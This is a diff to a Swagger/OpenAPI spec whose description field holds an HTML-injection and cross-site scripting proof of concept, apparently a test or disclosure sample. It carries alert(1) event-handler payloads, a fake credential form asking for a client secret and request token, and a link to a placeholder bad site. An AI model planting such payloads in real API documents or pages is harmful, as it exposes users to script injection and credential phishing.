@@ -1,6 +1,6 @@
 swagger: "2.0"
 info:
-  description: "This is an example how an attacker can ask your information by Johx(johxgks@gmail.com)<img src=https://www.wpblog.com/wp-content/uploads/2017/08/wordpress-site-is-hacked.jpg));><br>Client Secret : <input autofocus onfocus=alert(1)><select></select> <br> Request Token : <input autofocus onfocus=alert(1)><select></select> <br> <br> <b>If you have problems putting these credentianls, please contact you to the following link: http://badwebsite.com/johx <b><img src=https://media.wired.com/photos/5c0b012587e1b12d64ab1697/master/pass/Quora-Hacked_Final.png onerror=alert(1);>" 
+  description: "This is an example how an attacker can ask your information by Johx(johxgks@gmail.com)<br><img src=https://www.wpblog.com/wp-content/uploads/2017/08/wordpress-site-is-hacked.jpg));><br>Client Secret : <input autofocus onfocus=alert(1)><select></select> <br> Request Token : <input autofocus onfocus=alert(1)><select></select> <br> <br> <b>If you have problems putting these credentianls, please contact you to the following link: http://badwebsite.com/johx <b><img src=https://media.wired.com/photos/5c0b012587e1b12d64ab1697/master/pass/Quora-Hacked_Final.png onerror=alert(1);>" 
   version: "1.0.0"
   title: "Welcome Jonathan JOhx Form"
   termsOfService: "maintenance"
